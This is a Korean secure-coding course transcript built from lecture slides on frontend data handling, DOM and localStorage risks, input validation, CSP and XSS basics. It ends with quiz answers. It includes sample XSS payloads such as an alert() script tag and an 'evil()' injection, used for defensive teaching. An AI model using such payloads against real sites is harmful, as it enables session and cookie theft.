  - `Web App`(모니터 화면 아이콘) ↔ `Mobile App`(스마트폰 아이콘) — 양방향 화살표
  - 아래로 화살표 → 프론트엔드 기술 아이콘: `HTML`, `CSS`, `JS`, Node.js(JS 육각형 로고)
- 가운데 양방향 화살표: FRONT-END(Web App/Mobile App) ↔ `Server`
- 오른쪽 초록 영역 **BACK-END**
  - `Server`(서버 랙 아이콘)에서 화살표로 `Database`(DB 원통 아이콘), `API`(API 창 + 톱니바퀴 아이콘)와 연결
  - Server에서 아래로 화살표 → 백엔드 언어 아이콘: `Java`, Python, C++, PHP(톱니바퀴)

---

## [2-SLIDES] 7주차 1차시 p.7 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
입력 데이터 캡처
- 이벤트 리스너(Event Listener) 활용
사용자의 입력 이벤트(예: onChange, onInput, onSubmit)를 통해 입력 데이터를 캡처
- 양방향 데이터 바인딩
React, Angular, Vue 등 프레임워크에서 제공하는 바인딩 기법으로 UI와 상태를 동기화
입력 데이터 유효성 검증
- HTML5 내장 검증
required, pattern, min, max 등의 속성으로 기본 검증 수행
- 클라이언트 사이드 JavaScript 검증
정규표현식 및 커스텀 함수로 복잡한 유효성 검증 로직 적용
- 즉각적 피드백 제공
실시간 에러 메시지 표시 및 UI 업데이트를 통해 사용자 경험 향상

---

## [2-SLIDES] 7주차 1차시 p.8 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
입력 데이터 보안 처리
- 입력값 이스케이핑(Escaping) 및 필터링
XSS 및 인젝션 공격 방지를 위해 사용자 입력값을 안전하게 이스케이프 처리
서드파티 라이브러리(예: DOMPurify) 사용하여 HTML 및 스크립트 태그 제거
- 정적 분석 및 테스트
클라이언트 코드 내 입력 처리 로직에 대한 보안 리뷰 및 단위 테스트 수행
입력 데이터 서버로 전송
- 안전한 AJAX/Fetch 요청
HTTPS를 통한 암호화된 통신으로 데이터 전송
- 오류 처리 및 로깅
전송 실패나 검증 오류 시 사용자에게 명확한 메시지 제공 및 클라이언트 측 로그 기록

---

## [2-SLIDES] 7주차 1차시 p.9 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
1. 특정 페이지 요청을 백엔드가 받아 적절히 HTML을 완성하여 응답한 것을 렌더링하여 화면 표출
- Static HTML(화면구성) + JavaScript(입력제어)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 왼쪽: Burp Suite 요청/응답 (Raw 탭)]** — 게시판 목록 페이지 요청 시 서버가 완성된 HTML을 응답(SSR 방식)

Request (Pretty / **Raw** / Hex 탭 중 Raw 선택):
```http
GET /board/list HTTP/1.1
Host: localhost:8000
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: ko-KR,ko;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://localhost:8000/board/main
Cookie: JSESSIONID=C9F78A5C7408DFFAD96E407CF0FBC53D
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

Response (Pretty / **Raw** / Hex / Render 탭 중 Raw 선택):
```http
HTTP/1.1 200
Vary: Origin
Vary: Access-Control-Request-Method
Vary: Access-Control-Request-Headers
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Pragma: no-cache
Expires: 0
Content-Type: text/html;charset=UTF-8
Content-Language: ko-KR
Date: Wed, 05 Mar 2025 05:57:13 GMT
Connection: close
Content-Length: 4432
```
응답 본문 16~25행 (**빨간 박스 강조** — 서버가 완성해서 보낸 HTML):
```html
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <title>시큐어코딩랩 - 게시판 목록</title>
   universal 
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <link rel="stylesheet" href="../../css/main.css">
```
(※ 검증: Python으로 확인 — 2025-03-05는 수요일(Wed)로 Date 헤더와 일치, JSESSIONID 값은 32자리 16진수)

**[파란 화살표 →] 화면 캡처 오른쪽: 브라우저 렌더링 결과**
- 탭 제목 `시큐어코딩랩 - 게시판 목록`, 주소창 `localhost:8000/board/list`
- 상단 배너: (주)오픈이지 로고 + `안전한 소프트웨어를 만들기 위한 노력`
- 메뉴: `메인` | `게시판` | `시큐어코딩 테스트` | `DB 초기화` — 우측 `[ test 님 ]` `로그아웃` `정보수정`
- 검색: 드롭다운 `제목` + 입력칸 + `검색` 버튼
- 게시판 표:

| # | 제목 | 작성자 | 댓글 | 조회 | 추천 | 작성일 |
|---|---|---|---|---|---|---|
| 1 | asfdasfds<script>alert('XSS!!');</script> | 테스트 | 0 | 2 | 0 | 2025-02-25 |

- 페이지 번호 `1`, 버튼 `목록` `쓰기`, 하단 `Copyright © (주)오픈이지 2021-2025`
- 제목에 넣은 `<script>alert('XSS!!');</script>`가 실행되지 않고 글자 그대로 표시됨 → 서버가 HTML 이스케이프(`&lt;script&gt;...`)하여 응답한 것으로 보임 (※ 검증: Python html.escape 결과 `asfdasfds&lt;script&gt;alert(&#x27;XSS!!&#x27;);&lt;/script&gt;` — 이렇게 인코딩되면 브라우저에 원문 문자열로 표시됨. 실제 응답 본문의 해당 행은 캡처에 보이지 않음)

---

## [2-SLIDES] 7주차 1차시 p.10 · 프론트엔드에서 입력 데이터 처리 방식
프론트엔드에서 입력 데이터 처리 방식
2. 기능별 API 요청에 따른 백엔드 처리 결과 정보를 프론트엔드에서 적극적으로 화면에 구성하여 표출
- Dynamic HTML(화면구성) + JavaScript(입력 제어 및 API 호출제어)

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[화면 캡처 왼쪽: 브라우저(Firefox) 개발자 도구 네트워크 응답]** — 탭 `헤더` `쿠키` `요청` **`응답`(선택)** `타이밍` `스택 추적` `보안`, `속성 필터`, 형식 `JSON`. JSON 트리 전체가 **빨간 박스로 강조**됨 (백엔드 API가 화면 데이터 대신 JSON을 응답):
```text
menus: [ {…}, {…}, {…} ]
  0: Object { displayOrder: 1, name: "Drinks", id: "drinks", … }
     displayOrder: 1
     name: "Drinks"
     products: []
     children: [ {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…}, {…} ]
       0: Object { displayOrder: 1, name: "Hot Coffee", id: "hot-coffee", … }
       1: Object { displayOrder: 2, name: "Cold Coffee", id: "cold-coffee", … }
       2: Object { displayOrder: 3, name: "Hot Tea", id: "hot-tea", … }
       3: Object { displayOrder: 4, name: "Cold Tea", id: "cold-tea", … }
       4: Object { displayOrder: 5, name: "Refreshers", id: "refreshers", … }
       5: Object { displayOrder: 6, name: "Frappuccino® Blended Beverage", id: "frappuccino-blended-beverage", … }
       6: Object { displayOrder: 7, name: "Iced Energy", id: "iced-energy", … }
       7: Object { displayOrder: 8, name: "Hot Chocolate, Lemonade & More", id: "hot-chocolate-lemonade-more", … }
       8: Object { displayOrder: 9, name: "Bottled Beverages", id: "bottled-beverages", … }
     id: "drinks"
     uri: "/drinks"
  1: Object { displayOrder: 2, name: "Food", id: "food", … }
     displayOrder: 2
     name: "Food"
     products: []
     children: [ {…}, {…}, {…}, {…}, {…} ]
       0: Object { displayOrder: 1, name: "Breakfast", id: "breakfast", … }
       1: Object { displayOrder: 2, name: "Bakery", id: "bakery", … }
       2: Object { displayOrder: 3, name: "Treats", id: "treats", … }
       3: Object { displayOrder: 4, name: "Lunch", id: "lunch", … }
       4: Object { displayOrder: 5, name: "Snacks", id: "snacks", … }
     id: "food"
     uri: "/food"
  2: Object { displayOrder: 3, name: "At Home Coffee", id: "at-home-coffee", … }
     displayOrder: 3
     name: "At Home Coffee"
     products: []
     children: [ {…}, {…}, {…} ]   (접힌 상태)
     id: "at-home-coffee"
     uri: "/at-home-coffee"
```
(※ 검증: 요약 표기 `[ {…} ×9 ]`, `[ {…} ×5 ]`와 펼친 항목 수 9개(0~8)·5개(0~4) 일치)

**[파란 화살표 →] 화면 캡처 오른쪽: 브라우저에 동적으로 구성된 화면**
- 탭 `Home: Starbucks Coffee Comp…`, 주소창 `https://app.starbucks.com`
- 상단 메뉴: `ORDER` `CARDS` `GIFT`, 우측 `Find a store` `Sign in` `Join now`
- 좌측 인사말 `Good afternoon`(해 아이콘), 우측 `STARBUCKS® REWARDS` 카드 영역(무료 음료·생일 음료·앱 결제 혜택 안내 카드), `Join now` / `Sign in` 버튼, 하단 `Start an order` 버튼
→ API(JSON) 응답 데이터를 프론트엔드 JavaScript가 받아 화면(메뉴 등)을 구성하는 CSR 방식 예시

---

## [2-SLIDES] 7주차 1차시 p.11 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.12 · DOM 기반 보안 문제
DOM 기반 보안 문제
정의 및 개념
DOM(Document Object Model)을 직접 조작하는 과정에서 발생하는 보안 취약점
→ 클라이언트 사이드에서 사용자 입력 또는 외부 데이터를 적절한 검증 없이 DOM에 반영하면, 공격자가 악의적 스크립트를
삽입할 수 있음
주요 특징
서버에서 처리되지 않고, 클라이언트(브라우저)에서만 발생
기존 XSS와 달리, DOM 조작 로직 내부에서 발생하는 경우가 많음
공격 유형
- DOM 기반 XSS: 문서 객체를 직접 조작하여 공격자가 임의의 스크립트를 실행시키는 공격
- 클라이언트 사이드 데이터 조작: 사용자 입력이나 URL 파라미터를 검증 없이 DOM에 삽입하는 경우

---

## [2-SLIDES] 7주차 1차시 p.13 · DOM 기반 보안 문제
DOM 기반 보안 문제
발생 경로
- 취약한 DOM 조작 함수 사용
innerHTML, document.write, outerHTML 등으로 사용자 입력을 직접 삽입
- 부적절한 입력 검증
URL 파라미터, 해시(fragment) 값 등 외부 데이터를 제대로 필터링하지 않음
- 동적 콘텐츠 생성
클라이언트에서 API 응답 또는 사용자 입력을 기반으로 동적으로 HTML을 생성할 때
구체적 예시
- URL 파라미터를 location.hash를 통해 DOM에 그대로 반영하는 경우
- 사용자 입력을 검증 없이 element.innerHTML에 할당하여 악성 스크립트 실행 가능
공격 시나리오
공격자가 문서의 URL을 변조해두면, 해당 페이지를 로드할 때 악성 스크립트가 실행되어 쿠키 탈취, 세션 하이재킹 등이 발생

---

## [2-SLIDES] 7주차 1차시 p.14 · JavaScript 실행 환경에서의 보안 문제
JavaScript 실행 환경에서의 보안 문제
JavaScript 실행 환경 특성
클라이언트 브라우저에서 동적으로 코드가 실행됨
다양한 방식으로 외부 데이터를 처리하고, 동적 코드 실행(dynamically executed code)이 가능함
보안 위협의 발생 원인
- 동적 코드 실행 함수 사용
eval(), new Function(), setTimeout()/setInterval()에서 문자열 인자 사용
- 글로벌 객체 노출
window나 document 같은 전역 변수나 객체가 오염되거나, 공격자가 조작 가능한 상태로 노출
- 서드파티 스크립트 및 라이브러리
외부 스크립트나 패키지의 취약점, 불충분한 검증 시 원치 않는 코드 실행 위험
- 프로토타입 체인
객체의 프로토타입에 악의적 속성을 추가하여, 애플리케이션 전체에 영향을 미침

---

## [2-SLIDES] 7주차 1차시 p.15 · 로컬 저장소의 보안 문제
로컬 저장소의 보안 문제
로컬 저장소란?
HTML5에서 제공하는 클라이언트 측 저장소 (localStorage, sessionStorage, IndexedDB)
→ 브라우저에 데이터를 저장할 수 있는 편리한 기능
주요 활용 범위
- 사용자 선호도, 테마, 임시 캐시 데이터 저장
- 비동기 웹 애플리케이션에서 상태 관리 및 빠른 데이터 접근
장점
- 서버와의 통신 없이 빠른 데이터 읽기/쓰기 가능
- 영구적 저장 (localStorage) 또는 세션 기반 저장 (sessionStorage)

---

## [2-SLIDES] 7주차 1차시 p.16 · 로컬 저장소의 보안 문제
로컬 저장소의 보안 문제
XSS 공격에 의한 데이터 탈취
XSS 취약점으로 악의적 스크립트가 실행될 경우, 로컬 저장소의 모든 데이터에 접근 가능
→ 저장된 민감 정보(인증 토큰, 개인정보 등)가 공격자에게 노출
암호화 미적용
로컬 저장소는 기본적으로 평문으로 데이터를 저장하므로, 민감 정보가 그대로 노출될 위험
데이터 무결성 위협
악성 스크립트가 저장된 데이터를 수정, 삭제하거나 조작할 수 있음
클라이언트 사이드에서 쉽게 접근 및 변경이 가능
Same-Origin Policy 한계
도메인 간 격리 적용되지만, 동일 도메인 내에서는 모든 스크립트가 접근 가능

---

## [2-SLIDES] 7주차 1차시 p.17 · 보안에 취약한 API 호출 방식
보안에 취약한 API 호출 방식
API 호출의 역할
프론트엔드에서 데이터를 주고받기 위한 핵심 통신 수단
사용자 인터랙션에 따라 동적으로 API를 호출하여 데이터를 갱신
취약한 API 호출 방식 사례
- 민감 데이터 노출
- 미암호화 통신
- 부적절한 인증/인가 처리
- 잘못된 CORS 설정

---

## [2-SLIDES] 7주차 1차시 p.18 · 보안에 취약한 API 호출 방식
보안에 취약한 API 호출 방식
민감 데이터 노출
API 호출 시 URL의 쿼리스트링에 민감 정보를 포함할 경우, 브라우저 기록, 로그, 캐시 등에서 쉽게 탈취 가능
네트워크 통신 취약점
HTTPS 미사용, 취약한 SSL/TLS 설정 등으로 중간자 공격(MITM) 위험 증가
암호화되지 않은 채널을 통해 민감 데이터가 평문 전송되는 경우
인증 및 권한 관리 취약점
프론트엔드에서 관리되는 토큰이 안전하게 보호되지 않으면, 탈취 후 권한 상승 공격 가능
만료되지 않은 토큰 또는 재발급 절차 미흡으로 인한 부적절한 접근 제어
CORS 및 API 접근 제어 문제
잘못 구성된 CORS 정책으로 인해 외부 악의적 도메인에서도 API 호출이 가능해짐
공개 API로 오인하여 불필요한 데이터 노출 위험

---

## [2-SLIDES] 7주차 1차시 p.19 · 프론트엔드 데이터 처리
프론트엔드 데이터 처리
01 프론트엔드 데이터 처리 개념
02 프론트엔드 보안 이슈
03 프론트엔드 보안 개발 방법

---

## [2-SLIDES] 7주차 1차시 p.20 · 사용자 입력 값 검증 및 필터링
사용자 입력 값 검증 및 필터링
목적 및 필요성
사용자 입력이 악의적 코드(예: 스크립트, 명령어 등) 삽입 등 보안 공격의 진입점이 될 수 있음
→ 클라이언트 측에서 입력 값을 선별적으로 허용(화이트리스트)하거나,
불필요한 문자를 제거하여 XSS, Command Injection 등 다양한 취약점을 방어
검증 vs. 필터링
- 검증(Validation)
입력 값이 기대한 형식과 범위에 부합하는지 확인 (예: 이메일 형식, 숫자 범위 등)
- 필터링(Sanitization)
입력 값에서 위험한 특수문자(예: <, >, &, ;, | 등)를 제거하거나 이스케이프 처리하여 안전하게 변환
프론트엔드 역할
즉각적인 사용자 피드백 제공 및 초기 보안 방어선 역할 수행
하지만, 클라이언트 측 검증은 우회 가능하므로, 서버 측 검증이 병행되어야 함

---

## [2-SLIDES] 7주차 1차시 p.21 · 사용자 입력 값 검증 및 필터링
사용자 입력 값 검증 및 필터링
HTML5 기본 검증
<input> 태그의 type, required, pattern, min, max 등 속성을 활용해 기본적인 형식 검증
브라우저 내장 검증으로 사용자 경험(UX) 개선
JavaScript를 이용한 커스텀 검증
정규표현식을 사용하여 복잡한 형식의 유효성 검사 구현
(예) 이메일, 전화번호, 날짜 형식 등
실시간 유효성 검사로 에러 메시지 및 인라인 피드백 제공
입력 값 필터링 라이브러리 활용
DOMPurify, sanitize-html 등 서드 파티 라이브러리를 사용하여 HTML, 스크립트 태그 제거 및 안전한 값으로 변환
프레임워크(React, Angular, Vue 등)의 내장 기능을 활용해 XSS 공격을 사전에 차단

---

## [2-SLIDES] 7주차 1차시 p.22 · 사용자 입력 값 검증 및 필터링
사용자 입력 값 검증 및 필터링
최소 허용 원칙(Whitelist) 적용
허용할 입력 형식을 명시적으로 정의하고, 그 외의 값은 모두 거부
사용자 정의 입력의 경우, 미리 정의된 안전한 패턴과 비교하여 필터링
입력 값 이스케이프 처리
출력 전 HTML 엔티티 인코딩을 통해 DOM 삽입 시 악의적 스크립트 실행 방지
서버와 클라이언트 모두에서 일관되게 적용
클라이언트와 서버 검증의 이중 방어
클라이언트 측은 사용자 경험을 위한 초기 검증 수단으로 활용하고,
반드시 서버 측에서 최종 검증 및 필터링을 수행하여 보안 취약점을 최소화
정기적인 보안 테스트 및 코드 리뷰
정적 분석 도구와 보안 스캐너를 활용해 입력값 처리 로직에 취약점이 없는지 점검
개발 및 배포 주기마다 최신 보안 모범 사례를 반영하도록 업데이트

---

## [2-SLIDES] 7주차 1차시 p.23 · CSP(Content Security Policy) 적용
CSP(Content Security Policy) 적용
CSP란?
허용하는 콘텐츠 출처를 명시적으로 정의하여, XSS, 데이터 인젝션 등 악의적 콘텐츠 실행을 방지하는 보안 표준
HTTP 응답 헤더(또는 HTML 메타 태그)를 통해 정책을 브라우저에 전달
CSP 적용의 필요성
- XSS 공격 완화: 스크립트 인젝션 시 공격자가 실행 가능한 스크립트 소스를 제한
- 데이터 무결성 보장: 외부 악성 리소스 로드를 방지하여, 안전한 콘텐츠만 렌더링
- 보안 강화를 위한 추가 레이어: 기존 보안 조치와 함께 적용 시 다중 방어 체계 구축
출처: https://www.securing.pl/en/why-should-you-care-about-content-security-policy/

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
**[도식: CSP 동작 예시]** (슬라이드 오른쪽 하단, 출처 securing.pl)
- 왼쪽 노트북(브라우저) ↔ 오른쪽 서버 랙
- `https://securing.pl/assets/file.js` — 초록 양방향 화살표(허용, 도메인 `securing.pl` 초록색 강조)
- `https://securing.pl/assets/file.jpg` — 초록 양방향 화살표(허용)
- `https://malicious.com/assets/file.js` — 도메인 `malicious.com` 빨간색 강조, 빨간 X 표시와 `blocked:CSP`
→ 정책에 허용된 출처(자기 도메인)의 리소스만 로드되고, 허용되지 않은 외부 악성 도메인의 스크립트는 CSP에 의해 차단됨

---

## [2-SLIDES] 7주차 1차시 p.24 · CSP(Content Security Policy) 적용
CSP(Content Security Policy) 적용
주요 CSP 지시문
- default-src: 기본 콘텐츠 출처 지정 (예: 'self')
- script-src: 스크립트 출처 제한 (신뢰된 도메인 및 inline 스크립트 제한)
- style-src: 스타일시트 출처 제한
- img-src: 이미지 로드 출처 지정
- connect-src: AJAX, WebSocket, API 호출 등 네트워크 요청 출처 제한
- report-uri / report-to: 정책 위반 시 리포트 전송
- 구성 방법
- HTTP 헤더 설정:
(예)
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';
- Meta 태그 사용 (보조 방식):
(예) <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
예시 정책 정리 (코드):
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none';
```
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
```
- HTTP 헤더 예시: 기본은 자기 출처('self')만 허용, 스크립트는 자기 출처 + `https://trusted.cdn.com`만 허용, `object-src 'none'`으로 플러그인 객체(`<object>`/`<embed>`) 로드를 전부 금지
- Meta 태그 예시: 기본·스크립트 모두 자기 출처만 허용
(※ 검증: Python으로 지시문 파싱 — 헤더 `{'default-src': ["'self'"], 'script-src': ["'self'", 'https://trusted.cdn.com'], 'object-src': ["'none'"]}`, 메타 `{'default-src': ["'self'"], 'script-src': ["'self'"]}`로 구문 정상, 마지막 `;`도 허용됨 — 일치. 참고: `object-src`는 위 '주요 CSP 지시문' 목록에는 없는 지시문이며, `report-uri`/`frame-ancestors`/`sandbox` 등은 meta 태그 방식에서는 지원되지 않아 HTTP 헤더 방식이 기본임)

---

## [2-SLIDES] 7주차 1차시 p.25 · 요약 정리
요약 정리
- 프론트엔드는 SSR·CSR 방식을 통해 사용자 입력을 주고받으며, UI를 동적으로 갱신합니다.
- DOM 조작과 로컬 저장소, CORS 설정 등 다양한 보안 이슈가 존재하므로, JavaScript 실행 환경의
취약점을 인식해야 합니다.
- 입력 값 검증·필터링으로 악의적 코드 삽입을 차단하고, 서버 측 재검증을 더해 보안을 이중화 합니다.
- CSP(Content Security Policy) 를 활용해 XSS·인젝션 공격을 완화할 수 있습니다.
- 코드 리뷰와 자동화된 CI/CD 파이프라인 보안 테스트를 통해 취약점을 조기에 발견·수정해야 합니다.

---

## [2-SLIDES] 7주차 1차시 p.26 · 참고 문헌
참고 문헌
- [KISA] 소프트웨어 개발 보안 가이드(2021.12.29)
- [KISA] 소프트웨어 보안약점 진단가이드(2021)
- [오픈이지북스] 실무에 바로 적용하는 해킹 방어를 위한 JAVA 시큐어코딩
- [홍릉과학출판사] 소프트웨어 개발 보안 실무 - 시큐어 코딩 원리와 실제
- [secu BOOK] 웹 해킹과 시큐어코딩 탐지/수정 실습가이드
- [에이콘출판사] 보안 위협 모델링 Threat Modeling - 위협 식별과 대응을 위한 소프트웨어 설계
- [책만] 모두를 위한 소프트웨어 보안 설계와 구현 - 취약점 분석부터 위협 모델링과 완화 전략, 보안 패턴,
암호화까지 안전한 소프트웨어의 모든 것
- [위키북스] 웹 애플리케이션 보안 완벽 가이드 - 체계적으로 배우는 안전한 웹 애플리케이션 제작 기법
- [한빛미디어] 웹 애플리케이션 보안 - 정찰, 공격, 방어 세 단계로 배우는 웹 애플리케이션 보안의 모든 것
- [한빛미디어] 웹 해킹 & 보안 완벽 가이드 - 웹 애플리케이션 보안 취약점을 겨냥한 공격과 방어

---

## [2-SLIDES] 7주차 1차시 p.27 · 감사합니다.
감사합니다.

---

## [2-SLIDES] 7주차 1차시 p.28 · 퀴즈
(변환 메모: 슬라이드 원본을 보고 다시 옮긴 내용)

**1. 다음 중 로컬 저장소(LocalStorage)에 민감 정보를 저장했을 때 발생할 수 있는 문제가 아닌 것은 ?**

1) XSS 공격이 성공하면 로컬 저장소 내용이 유출될 수 있다.
2) 로컬 저장소는 기본적으로 평문으로 저장된다.
3) 도메인이 다르면 로컬 저장소를 공유할 수 있다.
4) 악성 스크립트가 로컬 저장소 내용을 임의로 변경할 수 있다.

**2. SSR(Server-Side Rendering)과 CSR(Client-Side Rendering)에 대한 설명으로 옳은 것은 ?**

1) SSR은 브라우저가 기본 HTML만 받고, 모든 UI를 JavaScript로 구성한다.
2) CSR은 서버에서 데이터를 주입해 완성된 HTML을 전송한다.
3) SSR은 서버에서 HTML을 완성해 응답하고, CSR은 클라이언트가 JS로 화면을 동적으로 구성한다.
4) CSR은 검색 엔진 최적화(SEO)에 매우 유리하며, SSR은 초기 로딩이 느리다.

**3. 프론트엔드에서 외부 스크립트나 스타일의 로딩 출처를 제한해 XSS 같은 공격을 완화하기 위해 사용하는 보안 정책은 ? (영문 3글자)**

(　　　　　　)

---

## [2-SLIDES] 7주차 1차시 p.29 · 퀴즈 정답
퀴즈 정답
1. 다음 중 로컬 저장소(LocalStorage)에 민감 정보를 저장했을 때 발생할 수 있는 문제가 아닌 것은 ?
3) 도메인이 다르면 로컬 저장소를 공유할 수 있다.
Same-Origin Policy로 인해, 도메인이 다르면 로컬 저장소를 공유할 수 없습니다.
2. SSR(Server-Side Rendering)과 CSR(Client-Side Rendering)에 대한 설명으로 옳은 것은 ?
3) SSR은 서버에서 HTML을 완성해 응답하고, CSR은 클라이언트가 JS로 화면을 동적으로 구성한다.
SSR은 서버가 완성된 HTML을, CSR은 브라우저가 JS로 동적 화면을 구성하는 방식입니다.
3. 프론트엔드에서 외부 스크립트나 스타일의 로딩 출처를 제한해 XSS 같은 공격을 완화하기 위해 사용하는
보안 정책은 ? (영문 3글자)
( CSP )

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
- 정답 보기(`3) 도메인이 다르면…`, `3) SSR은 서버에서…`)와 3번 정답 `CSP`는 슬라이드에서 빨간 글씨로 표시됨.
(※ 검증: 1번 해설의 '도메인'은 정확히는 출처(origin = 스킴+호스트+포트) 단위 — localStorage는 출처별로 분리되므로 같은 도메인이라도 http/https나 포트가 다르면 공유되지 않음. 정답 자체는 맞음)

# [2-SLIDES] 7주차 2차시 — 프론트엔드 데이터 처리 / XSS / CSRF
키워드: 보안약점/Weakness/CWE/취약점/Vulnerability · SQL Injection/SQL 인젝션/SQL 삽입/에스큐엘 인젝션/에스큐엘/SQLi/CWE-89 · PreparedStatement/프리페어드 스테이트먼트/파라미터 바인딩/바인딩/setString · XSS/Cross-Site Scripting/크로스사이트 스크립팅/크로스 사이트 스크립팅/크로스사이트스크립팅/CWE-79 · Reflected XSS/반사형 XSS/리플렉티드 · Stored XSS/저장형 XSS/스토어드 · DOM XSS/DOM 기반 XSS/돔 기반/document.write/innerHTML · CSRF/Cross-Site Request Forgery/크로스사이트 요청 위조/크로스 사이트 요청 위조/XSRF/CWE-352 · CSP/Content Security Policy/콘텐츠 보안 정책/컨텐츠 시큐리티 폴리시 · SameSite/세임사이트/Strict/Lax/None · HTML Encoding/HTML 인코딩/이스케이프/Escape/엔티티/Entity/escapeHtml/textContent · ORM/Object-Relational Mapping/객체 관계 매핑/JPA/Hibernate/하이버네이트 · Authentication/인증/로그인 · Authorization/인가/권한/RBAC/ABAC/PBAC/최소 권한 · Session/세션/JSESSIONID/세션 쿠키/쿠키/HttpOnly/Secure · Token/토큰/Bearer/베어러 · OAuth2/OAuth 2.0/오아스/권한 위임/Authorization Code/인가 코드/PKCE/state · Regex/정규식/Regular Expression/Pattern/Matcher/정규 표현식 · Filter/필터/Interceptor/인터셉터/Servlet/DispatcherServlet · Threat Modeling/위협 모델링/STRIDE/스트라이드/DREAD/드레드/MS-SDL/MTMT · SSR/CSR/Server-Side Rendering/Client-Side Rendering/서버 사이드 렌더링/클라이언트 사이드 렌더링

## [2-SLIDES] 7주차 2차시 p.1 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.2 · 📌
📌
학습 목표
✅
XSS(크로스 사이트 스크립팅)의 개념과 유형을 이해한다.
✅
실제 XSS 공격 기법을 학습하고, 취약점 진단 방법을 익힌다.
✅
XSS 방어 기법을 적용하여 웹 애플리케이션 보안을 강화할 수 있다.

---

## [2-SLIDES] 7주차 2차시 p.3 · 📍
📍
학습 내용
1. XSS 취약점 이해
2. XSS 취약점 진단
3. XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.4 · XSS 취약점 진단 및 대응
XSS 취약점 진단 및 대응
01 XSS 취약점 이해
02 XSS 취약점 진단
03 XSS 취약점 방어

---

## [2-SLIDES] 7주차 2차시 p.5 · XSS(크로스 사이트 스크립팅) 이란?
XSS(크로스 사이트 스크립팅) 이란?
XSS 개요
검증되지 않은 외부 입력 값을 웹 응답에 그대로 반영하여 악의적 스크립트가 실행되는 취약점
→ 사용자 브라우저에서 악성 코드가 동작해, 쿠키· 세션 등 민감 정보 탈취 가능
발생 원인
- 외부에서 입력된 사용자 입력 값을 검증하지 않고 그대로 응답에 반영
- DB에 저장된 데이터를 읽어서 출력할 때 DB에서 읽어온 값을 검증하지 않고 출력 값으로 사용
- 자바스크립트로 DOM구조를 조작하여 페이지를 변경하는 경우 변경되는 내용을 검증하지 않고 브라우저에 표시하는 경우
예상되는 피해
이 취약점으로 인해 해당 사용자 PC는 악성코드를 다운로드 받아 좀비 PC가 되거나,
사용자가 피싱 사이트로 접속되게 하거나, 사용자의 중요 정보를 공격자에게 전송하는 침해사고를 당할 수 있음

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[그림] 오른쪽 위: 후드와 복면을 쓴 해커가 노트북 앞에 앉아 있고, 뒤의 모니터 화면에 "XSS <script>" 글자와 빨간 경고 폭발 아이콘(!)이 표시된 일러스트. 노트북에서 주사기 모양 아이콘이 화면 쪽으로 향함(악성 스크립트 주입을 상징).

---

## [2-SLIDES] 7주차 2차시 p.6 · XSS 취약점 공격 흐름
XSS 취약점 공격 흐름
1. 공격자
악성 스크립트 삽입(예: <script>evil('XSS');</script>)
2. 웹 애플리케이션
입력 값 검증 없이 페이지에 반영하거나 DB에 저장
3. 피해 사용자
페이지 접속 시 악성 스크립트가 브라우저에서 실행
→ 쿠키·세션 탈취, 임의 명령 수행 등 피해 발생

(변환 메모: 아래는 이미지·도표 판독 내용 — 글자 정확도 낮을 수 있음)
[그림] 오른쪽 흐름 도식 (상단 제목 "XSS", 아래에 왼쪽→오른쪽 진행 화살표)
- 공격자(복면 쓴 인물)의 노트북 화면: `<script> evil()` → (화살표) →
- 웹 애플리케이션(웃는 얼굴의 서버) 문서: `<script> evil() </script>` → (화살표) →
- 피해 사용자(화난 표정, 머리 위 빨간 폭발 표시)의 노트북 화면: `<script> evil()`
즉 공격자가 넣은 스크립트가 서버를 거쳐 피해자 브라우저에서 그대로 실행되는 1→2→3 단계를 그림으로 표현.

---

## [2-SLIDES] 7주차 2차시 p.7 · XSS 취약점 유형
XSS 취약점 유형
Reflected XSS
사용자 입력이 즉시 반영되어 페이지에 표시
검색창, URL 파라미터 등을 통해 스크립트가 반사되어 실행
Stored XSS
게시판, 댓글, 프로필 등 DB에 악성 스크립트가 저장되어 다수 사용자에게 전파
DOM 기반 XSS
클라이언트 측 스크립트(DOM 조작)에서 발생
location.hash, location.search 등 브라우저 객체를 통한 동적 스크립트 삽입

---

## [2-SLIDES] 7주차 2차시 p.8 · XSS 취약점 공격 피해
XSS 취약점 공격 피해
세션 쿠키 탈취
자동 로그인, 권한 정보 등 노출
사용자 계정·개인정보 유출
